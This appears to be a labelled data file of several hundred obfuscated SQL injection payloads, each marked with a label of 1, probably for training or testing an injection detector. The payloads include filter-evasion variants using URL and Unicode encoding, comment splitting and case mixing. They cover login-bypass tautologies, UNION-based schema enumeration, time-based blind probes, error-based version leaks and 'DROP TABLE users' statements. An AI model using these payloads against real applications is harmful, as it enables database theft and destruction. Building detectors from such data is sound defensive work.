"'/**/OR/**/1=1/**/--/**/#y5jt6m9qw", 1
"'UNIoNselECtnull,NuLl,", 1
"nULl/*%0a*//*!*/and/*%0a*/1lIke1--", 1
"1' oR IF(SubSTrIng(databASE(), 1, 1)='A', sLeeP(5), 0) --", 1
"1))/**/uniON/**/sElecT/**/1,dAtABase(),3 Or 'B'='b'--", 1
"1AND%0d%0a1=1/*%0d%0a*/", 1
"1'/**/O/**/R/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--", 1
"'unIOn%0ASElEctNull,NULl,nuLl", 1
"-- RAndOm_noiSE--", 1
";%2f*!12345*/DRop%u0020%74AbL%65%U0020uSers;%u%30020%2d-", 1
"1%u0020A/*!12345*/ND%u00201=1", 1
"' && (1=1)1In (1)1  -- RANdOM_NoIsE--", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F AND 'a'='a'--%2F%2A%2A%2F", 1
"%2527%2520OR%25%25320%25271%2527%25%2533D%25271", 1
"%27%20%254fR%201%3D1%20-%252d%20--knfl75rtwe45spi", 1
"1'/**/O/**/R/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"test%27%20or%20%271%27%3E%3D%271%27%20/*", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20%2329rqy5r", 1
"tESt%27%20Or%20%%32%371%27%3%44%271%2%37%20--%20", 1
"1%29)%20UN%49ON%20SELECT%201,d%61taba%73e(),3--", 1
"%3BSEL/**/ECTpg_sleep%285%29%3B--%250d%250a", 1
"1%27%20O/**/%52%20IF(subs%74ring(database(),%2%30%31,%20%31)%3%44%27a%27,%20SLEEP(5)%2c%200)%2%30--", 1
"1%u0027%u0020OR%u0020asci%69(subs%74ring(database(),%u0020%31,%201))%20>%u0020100%u0020--", 1
"test%27%20OR%20%271%27	%3D%09%271%27%20/*", 1
"1%u0027%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020table_name,%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020null%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020FROM%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020information_schema.tables%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020--#8ioqkn5", 1
"%%750027%u00%320%4fR%u0020EXISTS(SELECT%%7500201%u0%3020FROM%u0020u%73ers)--", 1
"%25u0027%2520UNION%25u0020SELECT%25u0020%2531%2C2%2C%2533--%23iy831", 1
"1%u0027%u0020UN/**/ION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"%u0027%u0020OR%u0020%u00271%u0027%3D%u00271--c9bhogo", 1
"1'/**/UN/*!*/ION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"'AND/*%0a*/extractvalue(1,concat(0x5c,version()))AND'a'='a'--", 1
"test'  ||  '1'%09<=%20'1'  --  --ju6jzginjh0yev", 1
"admin%u0027O/**/R/*%0d%0a*/%u00271%u0027=%u00271%0a", 1
"' A%4eD extract%76alue(1,concat(0x5c,v%65rsi%6fn()%29)--", 1
"%27%20XOR%20%271%%327%3D%2%371", 1
";/*!12345*/DROPTABLE%0d%0ausers;--", 1
"WAITFOR DELAY '0:0:5' OR (1)--#7j73g", 1
"1%u0027/**/oraScII(SubsTriNG(DATabase(),1,1))>%0a100/*%0a*/--", 1
"1))%u0020uNiON%u0020seLeCT%u00201,DaTabasE(),3%09%09%09AND%09%09%09'a'	=%09'a'--", 1
";SELECT%0d%0apg_sleep(5);%0d%0a/*!12345*/-- random_noise--", 1
"", 1
"test%27%20OR%20%271%27LIKE%271%27%20%2F%2A", 1
"test' OR '1'='1' /*--m8ylcwz", 1
"1)/**/UNIOn SELEC%54 %31,DAtAB%41sE(),3-%2d", 1
"1' or aScii%28suBsTriNg(DAt%61BASE(), %31, 1%29%29 > 100 --", 1
"test'    OR    '1' =	'1'    --", 1
"' anD 1<=1 -- #gM26SQtI6v72Q", 1
"%27%20anD%20EXtraCtVaLuE(1,CONCat(0x5C,veRSiON()))--", 1
"1))%%320UNION%20SE%4cECT%201,dat%61%62as%65(),3 OR (1)--", 1
"%27%20OR%201%3C%3D1%20--%20", 1
"1'/**//**//**//**/XOR/**//**//**//**/ascii(substring(database(),/**//**//**//**/1,/**//**//**//**/1))/**//**//**//**/>/**//**//**//**/100/**//**//**//**/--", 1
"1)/*!*/UNION SELECT 1,database(),3 OR 'b'='b'----e8rg4yu62742iw1", 1
"' UNiON sEl%45Ct%20NULl, nuLL, Nul%6c --%20", 1
"1AND", 1
"1	=  1/*%0a*/", 1
"test' OR '1'>='1' -- #yb4quhd", 1
"%27%20anD%201%3dCONVErt(int,@@VERSIOn)--", 1
"1%29%29%20UNION%20SELECT%201%2%43d%61%74ab%61se%28%%329%2C3--", 1
"' AND extractvalue(1,concat(0x5c,version())) OR (1)----grzz3benhos1nj", 1
"%27/**/UnION/**/sElect/**/NULL,/**/NULL,/**/NUlL/**/--/**/", 1
"'/**/U%4eION/**/SEL%45C%54/**/null,/**/null,/**/%6eull/**/  /*!*/AND  1	=	1--/**/", 1
"1%u0027%u0020Or%u0020ASCIi(SuBSTrIng(dATaBASE(),%u00201,%u00201))%u0020>%u0020100%u0020--#yMM9KG", 1
"admin%27%20||%20(1%3D1)%271%27%3D%271", 1
"test' OR '1'<='1' /*", 1
"TEst'/**/or '1'='1' /*", 1
"; SELEC%54 pg_sleep%285); %2d-", 1
"'UNION%0d%0aSELECT/*%0a*/1,2,3--/*%0d%0a*/", 1
"%u0027/*!12345*/UNION%u0020SELECT%u00201,2,3--", 1
"'OR/*%0a*/'1'='1", 1
"", 1
"1%27%20&&%20(1%3D1)substr%69ng(da%74a%62%61se(),%201,%201)%20%3D%20%27s%27%20--", 1
"'				AND				1%09=  1				 -- random_noise--				#uq7vd", 1
"' || '1'LIKE'1#n8qp41zt7i3khj", 1
"admin%u0027/**/OR/**/%u00271%u0027=%u00271--0e2u0ek", 1
"1'/*!12345*/aND  SUbSTrIng(dAtaBASE(),  1,  1)  %20=%09  'S'  --", 1
";%u0020%u0020%u0020%u0020%u0020%u0020DROP%u0020%u0020%u0020%u0020%u0020%u0020TABLE%u0020%u0020%u0020%u0020%u0020%u0020users;%u0020%u0020%u0020%u0020%u0020%u0020--", 1
"' OR%20'1%27='1", 1
";SELECTpg_sleep(5);--", 1
"", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3E%3D%20%27s%27%20 OR 'b'='b'--", 1
"1) UNION SELECT 1,database(),3 OR (1)--", 1
"' || (1=1)'1'='1 OR 'b'='b'", 1
"'/*!*/UNION%09%09SELECT%09%091,2,3%09%09OR%09%09(1)--", 1
"1%27/**/AND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/ OR 'b'='b'----94mxt5wdymv0y", 1
"1%u0020AND%u00201>=1", 1
"'/**/UNION SELECT nu%6cl, n%75%6cl, nul%6c --", 1
"' union sElEct 1,2,3--", 1
"WAITFO%2552%25u0020DEL%2541Y%25u0020%25u00270%3A0%253a5%25u0027%25u0020AND%2520%25u0027a%25u0027%3D%25u0027a%25u0027--", 1
"'%09%09OR%09%091  = 1%09%09 OR 'b'='b'--%09%09", 1
"WAI%54F%4fR%20DELAY '0:0:5'--", 1
"%25u0027%25u0020OR%25u0020EXISTS%28SELECT%25u00201%25u0020FROM%25u0020users%29--", 1
"1' AND substring(database(), 1, 1) IN (1) 's' --", 1
"admin'/**/|| '1'>='1 OR 'b'='b'", 1
"1)%09%09%09UniOn%09%09%09sELect%09%09%091,DaTAbasE(),3--", 1
"' anD 1=COnvErT(In%54,@@VER%53Ion%29%2d-", 1
";/**/dROPTaBLE%0aUsERs;--%0A", 1
"'/**/%4f%52/**%2feXIs%54s(SeLEct/**/1/*%2A/FROM/%2a*/USers)%20/*!*/anD 1=1--", 1
"1'/*!12345*/OR%09%09%09%09%09ASCii(sUbstRING(DaTABaSe(),%09%09%09%09%091,%09%09%09%09%091))%09%09%09%09%09>%09%09%09%09%09100%09%09%09%09%09--", 1
"'%20OR 1I%6e (1)1 --", 1
"%27%20UN/*!12345*/ION%20SELECT%20null%2C%20null%2C%20null%20--%20#khuykc5i9xo5iq", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020----jaiv9", 1
"1%27%2F%2A%2112345%2A%2FOR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"test%27%20O/*!12345*/R%20%271%27%3D%271%27%20/*", 1
"%27OR%2F%2A%250d%250a%2A%2F1%2509%3D%091%0A--", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520 -- random_noise--%2520", 1
"1'%20AND subs%74ring(da%74a%62ase(),%201, 1) = 's' --", 1
"' AND extractvalue(1,concat(0x5c,version()))--#50ns58fp", 1
"1%27/*!*/AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20 -- random_noise--", 1
"1'ORIF(substring(database(),1,1)=%09'a',", 1
"SLEEP(5),0)--", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users) AND 'a'='a'--#wghnbph", 1
"%27%2F%2A%2112345%2A%2FAND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"'/*%2a/x%6fr 1=1 --", 1
"'		OR		1%09=/*!12345*/ 1		--		--bdjhdlawmnp", 1
"'OREXIS%54S(SELECT%201%0d%0aFROM%75sers)%2d-/*%0a*/", 1
"'", 1
"AND%31IN(1)con%76ert(i%6et,@@versi%6fn)--", 1
";%%309DR%4fP%09TAB%4cE%09users%3b%09 OR (1)--", 1
"; SELECT pg_sleep(5); ----7jsrlk6tdima", 1
"%u0027%u0020%7c|%u0020%u00271%u0027%3D%u0027%31", 1
"1%20ANd%201%3D1--aj25v", 1
"tESt%u00%327%u%30020or%u0020%u0027%31%u0%3027>=%U00271%U0027%U%30020-%2d%u0020", 1
"WaiTfor%20DElAy%20%270%3a0%3a5%27--", 1
"'/*!12345*//**//**//**//**//**//**//**//**//**/OR/**//**//**//**//**//**//**//**//**//**/1	=	1/**//**//**//**//**//**//**//**//**//**/--/**//**//**//**//**//**//**//**//**//**/", 1
"admin' || (1>=1)'1'='1", 1
"'UNIONSELECT%0anull,null,null--#ul7j0vljftijmv", 1
"adm%2569n%2527%20%20%20%20%20%20%20%20OR%20%20%20%20%20%20%20%20%271%27%2509%3D%20%271", 1
"1'/*!12345*/UNIONSELECTtable_name,null,null/*%0d%0a*/FROMinformation_schema.tables%0a--", 1
"%27%20AND%20extractvalue%281,con%63%61t(0x5c%2c%76ersion()))--", 1
"%3b%20DRoP%20tAblE%20uSERs%3B%20 AnD 'A'='A'----C0H1aa359xwSI", 1
"admin%u0027%u0020%u0020OR%u0020%u0020%u00271%u0027%09%3D%u0020%u0020%u00271", 1
"%u0027/**%2fOr/**/%271%u0027=%u00271", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3E%3D%25u00271%25u0027%25u0020%2F%2A", 1
"1%27/**/AND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/--#vuipbbxhk1dir", 1
"; drOp TAble users; --", 1
"admin' OR '1'='1#rr3le1i9acquvn", 1
"1'/**/AND substring(database(), 1, 1) >= 's' ----ayo60z2em5", 1
"1 && 1IN (1)1", 1
"%3BSELECTpg_sleep%285%29%3B--%2F%2A%250a%2A%2F", 1
"' Or eXIStS(sElecT 1 frOM UsERs)--#c77b1fe5d0o", 1
"%27%20uniON%20sElEcT%201,2,3--#9teICPP4Q6pZO2w", 1
"1%29%20UNION%%320%53%45LECT%201%2Cdatab%61se%28%%329%2C3--", 1
";%20%20%20%20DROP%20%20%20%20TABLE%20%20%20%20users;%20%20%20%20--", 1
"%27/**/oR/**/exiStS(sElEcT/**/1/**/FROM/**/UseRS)--", 1
"1 AND 1=1#0qo3ncohsh", 1
"AdMiN' or '1'='1", 1
"WAITFOR%20DELAY%20%27%2530%253a0%3A5%27%252d-", 1
"1'AND/*%0d%0a*/substring(database(),1,1)=%0a's'--", 1
"%27 UNION SELECT%20nul%6c, %6eull, nul%6c  OR (1)--", 1
"test%27%20OR%20%271%27%3D%271%27%20/*%20%20%20%20OR%20%20%20%20(1)", 1
"admin'OR%0a'1'<='1/*%0d%0a*/", 1
"'%20AND/*!*/extractvalu%65(1,co%6eca%74(0x5c,version())%29--", 1
"test%27/**/OR/**/%271%27%20%3D%20%271%27/**/--/**/#u09ya", 1
"%25u0027%25u0020AND%25u00201LIKEconvert%28int%2C%40%40version%29--", 1
"' XOR '1'='1--yu56wsi9", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3C%3Dconvert%28int%2C%40%40version%29--", 1
"1 aND 1=1", 1
"%u0027UNIONSELECTnull,", 1
"null,null%u0020--%u0020random_noise--", 1
"1'/**//**/OR/**//**/IF(substring(database(),/**//**/1,/**//**/1)/**//**/=/**//**/'a',/**//**/SLEEP(5),/**//**/0)/**//**/--", 1
";%u0020S%45LECT%u00%320pg_s%6ceep(%35);%u0020--", 1
"%u0027%u0020oR%u0020%u00271%u0027=%u00271", 1
"1AND", 1
"1%3D1/*%0d%0a*/", 1
"'A/*!12345*/ND", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"test'||(1=1)'1'='1'--%0a", 1
"'					OR					EXISTS(SELECT					1					FROM					users)--", 1
"; sElECT pg_slEep(5); ----2FeTw", 1
"AdMiN%27OR%0a%271%27%3D%271", 1
"", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#u07xdqnnetr9hl", 1
"1))/**/UNION/**/SELECT/**/1,database(),3%u0020OR%u0020(1)--", 1
"%27%20XOR%201%253d1%20--%2520--iueasqbzeo6vsh", 1
"'/**/AND/**/1%09=  1/**//**/#/**/more_noise--/**/#bee77fl6yk34k3", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--#sufpbyffly4w2l", 1
"'oR%0%611=1/*%0d%0%61*/%2d-/*%0a*/", 1
"WAITFOR/**/DELAY/**/'0:0:5'--#2tkj4fb", 1
"'/*!12345*/&& extractvalue(1,concat(0x5c,version()))--#0c849sl", 1
"1' AND substring(database(), 1, 1) = 's'  -- random_noise----4kx7iuj5msud", 1
"test%27%2F%2A%2112345%2A%2FOR%20%271%27%3D%271%27%20%2F%2A # more_noise", 1
"1)%u0020%u0020UN%49ON%u0020%u0020SELECT%u0020%u00201,da%74abase%28),3-%2d", 1
"%27%2%30%%320%20OR%20%20%%320EXISTS%28%53E%4cECT%20%20%201%20%20%20FROM%20%20%20users%2%39-%2d", 1
"%u0027AND", 1
"1  =%201--", 1
"%27%20%20%20AND%20%20%20extractvalue(1,concat(0x5c,version()))--", 1
"1%27%20OR%20ascii%2528substring%28database%28%29%2C%25201%2C%201%29%29%2520%3E%2010%2530%20%252d- OR 'b'='b'", 1
"%27%20UNION%20SELECT%20nu%6cl,%20null,%20nu%6cl%20--%20#a9xna86dbfo", 1
"%31'%20oR asCIi%28subsTRINg(DaTaBaSE(), 1, 1)) > %31%300 --", 1
"%27 O%52 1=1 --", 1
"1%2%37AND%73ubst%72%69ng(data%62ase(),1,1)/*%0d%0a*/%09%3D%09%%327s%27--", 1
"1)%2f**%2fUNION%20SELECT%201,da%74abase(),3--", 1
"1'andSUBstrinG(DatAbaSe(),1,1)IN (1)'S'#MORE_noIsE--/*%0D%0A*/", 1
"test'%20%20OR%20%20'1' =	'1'%20%20/*", 1
";%u0020DROp%u0020tAble%u0020uSERs;%u0020--", 1
"1'AND%0asubstring(database(),", 1
"1,1)='s'--%0a", 1
"1' unIOn sELeCt TABLE_nAMe, NulL, nuLL froM InFOrmatioN_sCHEmA.TABleS --", 1
"' OR '1'='1 # more_noise#2oy3wa0z", 1
"WAITFOR DELAY '0:0:5'----c03u5u", 1
"test' OR '1'LIKE'1' /*", 1
"%27UNION%0d%0aSELECTnull,null,null--", 1
"1' UniOn seLEcT table_NaME, nuLL, NuLL frOm iNForMATIoN_SCHema.TaBles --", 1
"'/**/UNION/**/SELECT/**/1,2,3/**//*!*/AND/**/1=1--#a56adirjwpkj", 1
"1%20AnD%201%3D1", 1
"%27%20aND%201%3dConVERt%28int%2C%40%40vErSIOn%29 AND 'a'='a'--", 1
"1%09ANd%091>	=  1", 1
"'/*!*/AND%09%09%09%09%091  =  convert(int,@@version)--", 1
";SEL/*!12345*/ECTpg_sleep(5);/*%0a*/--%0d%0a", 1
"1))%20UN/*!*/ION%20SELECT%201,database(),3--", 1
"%27%20OR%%3201%%33D1%20--%20", 1
"waitFor%20DelAy%20%270:0:5%27--", 1
"te%73t%u0027%u0020%4fR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"%27%20O/*!*/R%201%3D1%20--%20", 1
"%u0027/**/and%u0020extRACtVALUE(1,CONCat(0x5C,VeRSiON()))--", 1
"'%20OR '1'=%271", 1
"1'  XOR  ascii(substring(database(),  1,  1))  >  100  --", 1
"a%64min'%2%30%2%30OR%20%20'1'%09LIKE  '1", 1
"test'/*!*/OR '1'='1' --", 1
";%u0020dRop%u0020TAbLe%u0020UsErS;%u0020--", 1
"1)UNION/*%0a*/SELECT/*%0a*/1,database(),3--", 1
"--q3gw3w", 1
"test'||'1'='1'", 1
"/*#dxfiv0nbtvl2wre", 1
";/**/DROP/**/TABLE/**/u%73%65rs;%2f**/%2d-", 1
"'%09%09Or%09%091liKE1%09%09--%09%09#E1Hu181", 1
"test'/*!*/OR'1'='1'%0d%0a/*", 1
"", 1
"1AND%0d%0a1IN (1)1/*%0a*/", 1
"%27%2520O/*!*/R%20%25271%27%3D%271", 1
"1%2527%2520oR%2520iF%28sUbSTriNg%28DaTABase%28%29%2C%25201%2C%25201%29%253d%2527A%2527%2C%2520sleEP%285%29%2C%25200%29%2520--", 1
"'XOR", 1
"extractvalue(1,concat(0x5c,version()))--/*%0d%0a*/", 1
"; SeleCT Pg_SlEeP(5); ----k7aovb4ek9eyt", 1
"'OR%0d%0a1LIKE1/*%0a*/--/*%0d%0a*/#gsfvhurcick5cho", 1
"'Or", 1
"eXisTs(SeLeCt1frOmuSeRs)--", 1
"1'/*!*/UNIONSELECT/*%0a*/table_name,null,nullFROM%0d%0ainformation_schema.tables--/*%0d%0a*/", 1
"' %55%4eIO%4e SELECT 1,2,3--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20----b19nea", 1
"1' AND substring(database(), 1, 1) = 's' ----bv5ky", 1
"'OR/*%0a*/'1'='1%0a", 1
"%u0027/*!12345*/UNION%u0020SELECt%u0020nUll,%u0020NULl,%U0020nULl%u0020--%u0020", 1
"1'    UNION    SELEC%54    tab%6ce_name%2c    nul%6c,    null    FROM    info%72mat%69on_schema.ta%62%6ces    --", 1
"1 aNd 1=1", 1
"1And%0A1=1", 1
"", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20--hyb7ik31ok4r", 1
"%2527%2520OR%2520EXISTS%28SELECT%25201%2520FROM%2520users%29----vigar", 1
"%27%20AND%201%3C%3Dconvert(int,@@version)--#9uvqa7nazzwht", 1
"%2%37%20UNIO%4e%20SELE%43T%20null%2c%%320null,%20null%20--%20", 1
"adm%69n%%327%%320XOR%20%271%27%3D%271", 1
"1' or %61SC%69I(SubSTrI%6Eg(DATaB%61Se(), 1, 1)) >%20100  aNd 'a'='A'--", 1
"'/*!12345*/AND/**/1=convert(int,@@version)----e0zegpalpb6oe7", 1
"'/*!*/&& (1=1)1=convert(int,@@version) # more_noise--", 1
"1%u0027%20%20%20%20aND%20%20%20%20SubstriNG(DAtaBaSE(),%20%20%20%201,%20%20%20%201)%20%20%20%20%20=%u0020%u0020%20%20%20%20%u0027S%u0027%20%20%20%20--", 1
"1%25u0027%25U0020Or%25U0020If%28sUbSTrIng%28DATaBAse%28%29%2C%25u00201%2C%25U00201%29%3d%25U0027A%25u0027%2C%25u0020sLeeP%285%29%2C%25U00200%29%25U0020--", 1
"1))/**/UN%2f*!%312345*/I%4f%4e/**/S%45LECT/**/1,databas%65(),3--", 1
"1/**/XO/*!12345*/R/**/1=1", 1
"1)) UnioN SELECt 1,DatABASE(),3--", 1
"%u0027UNION%20%53ELECT1%2c2,3--", 1
"", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20%20AND%20%27a%27%3C%3D%27a%27--%20", 1
"1    aNd    1%20=%201 OR (1)", 1
"' OR '1'IN (1)'1 # more_noise", 1
"test'/**/O%52/**/'1'%3d'1'%20 -- random_noise--/**/", 1
"; drOp tAbLe uSers; ----r0x755hib2w", 1
"1%u0027A/**/ND/*%0d%0a*/substring(database(),1,1)=%u0027s%u0027/*%0a*/--%0a", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2FEXISTS%28SEL%2F%2A%2A%2FECT%2F%2A%2A%2F1%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%29--", 1
"test'/*!*/OR '1'='1' /*#w2qufvim62gjvt0", 1
"1' AND %73ubstrin%67(dat%61base(), 1,%201) %3d 's' --", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)>=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"'/**/A/*!*/ND/**/1=convert(int,@@version)--#g68jo9wbn1", 1
"'%09%09%09&&%09%09%091%09=%091%09%09%09--%09%09%09", 1
"%u0027%u0020OR%u0020%u00271%u0027%20%3D%20%u00271", 1
"%U0027%u0020Or%U0020%u00271%U0027=%U00271#FQFTqGSfjsN", 1
"1'/**/OR/%2a*/ascii(s%75bst%72ing(dat%61base(),/*%2a%2f1,/**/1))/**/>/**%2f100%2f**/--", 1
"tesT'%09%09%09Or%09%09%09'1'	= '1'%09%09%09/*", 1
"'%20%20%20%20AND%20%20%20%20extractvalue(1,concat(0x5c,version()))--", 1
"%u0027/**/OR/**/%u00271%u0027IN/**/(1)%u00271", 1
"1)%29 UN%49o%4E SElecT 1,DATAb%61se(),3--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20/**//*!*/AND/**/1=1--", 1
"%25u0027%2F%2A%2A%2For%2F%2A%2A%2F%25u00271%25u0027%3D%25u00271", 1
"1/**//**//**//**//**//**/aNd/**//**//**//**//**//**/1%20=%091/**/#/**/mORE_noIse", 1
"' ||%201LIKE1 -%2d", 1
"'OREXISTS(SELECT/*%0a*/1FROMusers)--", 1
"'OR'1'%3d'1/*%0d%0%61*/", 1
"%u0027%u0020UN/*!*/ION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020--jwocbtwrtdanvs", 1
"1)/*!12345*/UNION SELECT 1,database(),3--#sj61zw", 1
"WAITFOR/*!12345*/DELAY%u0020%u00270:0:5%u0027--", 1
"1 AND 1>=1", 1
"%27/*!*/OR%20EXISTS(SELECT%201%20FROM%20users)--#wyyjp", 1
"'/**/ANDextractvalue(1,concat(0x5c,version()))--#afhazhjjxdie0/*%0d%0a*/", 1
"'AND1=1%0d%0aOR'b'='b'--%0a", 1
"test%u0027OR%0d%0a%u00271%u0027=%u00271%u0027/*%0a*//*/*%0d%0a*/", 1
"%27%20AND%201%3D1%20--%20--k7l4qa6wcgs43", 1
"' and EXTrACtvAlue(1,cOncAt(0x5C,vErsion()))--", 1
"%27%20AND%201%3D1%20--%20--nr27fhgz", 1
"1 aNd 1IN (1)1", 1
"'/**/AND/*%2a/1=1/%2a*/-%2d/**/", 1
"%27%2F%2A%2112345%2A%2FOR%20%271%27IN%20%281%29%271--zioh3k2k6", 1
"1'%09%%309%09%09OR%09%09%09%09IF(subst%72ing(d%61t%61base(),%09%09%09%%3091,%0%39%09%09%%3091)%20/**/=%09'a',%09%09%09%09SLEEP(%35)%2c%09%09%0%39%090)%%309%09%09%09--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  /*!*/AND 1=1----39zyu", 1
"1' A%4eD%20substring(database(), 1, 1%29 %3d%20's' --", 1
"1'OR/*%0a*/ascii(substring(database(),1,1))>100%0a/*!*/AND1=1--", 1
"1/**/A/**/ND/**/1=1--1r59mh", 1
"1 AND 1=1--28l2qf08", 1
"%27/**/AND1%3D1--%0a", 1
"%27%20AND%201IN%20(1)convert(int,@@version)--", 1
"'/*!12345*/UNION SELECT 1,2,3--", 1
"%27%20A/**/ND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29----fesr8lrx7yn2", 1
";SELECT/*%0a*/pg_sleep(5);%0d%0a--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20AND%20%27a%27IN%20%281%29%27a%27--", 1
"%u0027%u0020AnD%u00201LIKE1%u0020--%u0020", 1
"WAiTfOr delay '0:0:5'--", 1
"1))/*!*/U%4eION%20SELECT%%3201,%64atabase(),%33--", 1
"%27ANDextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%250d%250a", 1
"'&&extractvalue(1,concat(0x5c,version()))--", 1
"#kixsfyade6", 1
"1%27%20%20%20AND%20%20%20substring(database(),%20%20%201,%20%20%201)%20%20%20	%3D%20%20%20%20%27s%27%20%20%20--", 1
"1%25u0027%25u0020OR%25u0020IF%28substring%28database%28%29%2C%25u00201%2C%25u00201%29%3E%3D%25u0027a%25u0027%2C%25u0020SLEEP%285%29%2C%25u00200%29%25u0020--", 1
"admin' || (1LIKE1)'1'='1", 1
";%20%20%20%20drOp%20%20%20%20TaBLe%20%20%20%20USers;%20%20%20%20--", 1
"1%27%%320UNION%20SELECT%2%30%74able_na%6de,%%320null,%20null%20%46R%4f%4d%20informa%74ion_schema.tables%20--", 1
"1)) uNIoN%20%53eLECt 1%2cda%74AbaSe(),3--", 1
"adMiN' Or '1'LIKE'1", 1
"%2527%2F%2A%2112345%2A%2FOR%25201%253D1%2520--%2520", 1
"; DROP TABLE users; --#x2qi39fukpdg041", 1
"'    AND    1%09=%201%20%20  --%20", 1
"1/**/%41/**/ND/%2a*/1=1", 1
"1))%20UNIoN%20SEleCT%201,Database(),3 # more_noise--", 1
"'/*!12345*/AND%20%20%20%20%201%20=	1%20%20%20%20%20%20%20%20%20%20OR%20%20%20%20%20'b'%20=	'b'--%20%20%20%20%20--ji4tx4", 1
"1%09%09&&%09%09%31	=%201", 1
"' %55NION SELECT 1%2c2,%33----ozckki3l", 1
"%27%20OR%20%271%27%3D%271			#			more_noise", 1
"%u0027OR%0aEXISTS(SELECT1FROM%0d%0ausers)%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--/*%0a*/", 1
"1%u0020AND%u00201LIKE1--7ko13nu829rjja", 1
"TeSt%27%20OR%20%271%27%3D%271%27%20--%20", 1
"1%u0027%20%20%20AND%20%20%20substring(database(),%20%20%201,%20%20%201)%20%20%20%u0020=%09%20%20%20%u0027s%u0027%20%20%20%20%20%20AND%20%20%20%u0027a%u0027%u0020=%09%u0027a%u0027--", 1
";/**/SELECT/**/pg_sleep(5);/**/----k7sz7hnk9o53", 1
"admin'/**/OR/**/%271'%3d'1", 1
"%u0027orEXISTS(sELecT1FROm/*%0a*/USERS)--/*%0a*/", 1
";/**/SELECT/%2a*/pg_sl%65ep(%35);/**%2f--", 1
"1%27/%2a!*/OR IF(%73ub%73%74ring(dat%61base(), 1, 1)IN (%31)'a', SLEEP(5), 0) --", 1
"1'        Or        iF(suBSTRIng(dataBASE(),        1,        1)%20=%20'a',        SLEEP(5),        0)        --#s30fi71121lFn3", 1
"' OR 1=1  -- random_noise-- --rxd2zwyxakl", 1
"tESt%27%20Or%20%271%27%3D%271%27%20--%20", 1
"'/**/Or%09%09%09%09%09ExISTS(SelecT%09%09%09%09%091%09%09%09%09%09fROM%09%09%09%09%09uSerS)--", 1
"1' AND substring(database(), 1, 1) = 's' ----4t5ua3lkux", 1
"1))uNIOnSeLECt/*%0d%0a*/1,dAtabaSE(),3 /*!*/AND 1=1--", 1
"' aND eXTRactvALUE(1,cONcAT(0x5C,VerSIoN()))--", 1
"1)/*!12345*/UNiOn SElECT 1,dAtabAsE(),3--", 1
"; SELECT pg_sleep(5);  /*!*/AND 1=1--", 1
"1'%09%09%09UN/**/ION%09%09%09SELECT%09%09%09table_name,%09%09%09null,%09%09%09null%09%09%09FROM%09%09%09information_schema.tables%09%09%09--", 1
"' O%52 1=%31 --", 1
"WAITFOR	DELAY	'0:0:5'--", 1
"%u0%3027%u0020OR%u0020EXISTS(SE%4cECT%u0%3020%31%u002%30FR%4fM%u0020users)--", 1
"test'/**/O/*!*/R/%2a*%2f'1'<='1'%2f**/--/*%2a/", 1
"WAI%2554FOR%20DE%254cAY%20%270%3A0%3A5%27%252d-", 1
"1'UNIONSELECTtable_name,null,null", 1
"FROM", 1
"information_schema.tables--", 1
"%27AND%250a1%3Dconvert%28int%2C%40%40version%29--%250d%250a--f4417tvqr", 1
";%20SELECT%20pg_sleep(5);%20--#miehfwl", 1
"'OREXISTS(SELECT", 1
"1FROM%0d%0ausers) -- random_noise--", 1
"tESt'/**/Or/**/'1'='1'/**//*", 1
"WAiTfOr/**/DELaY/**/'0:0:5'--", 1
"1/**/A/**/ND/**/1=1#f2vznyali", 1
"'%20%20%20A/**/ND%20%20%20extractvalue(1,concat(0x5c,version()))--", 1
"ADMiN'/*!12345*/Or '1'<='1", 1
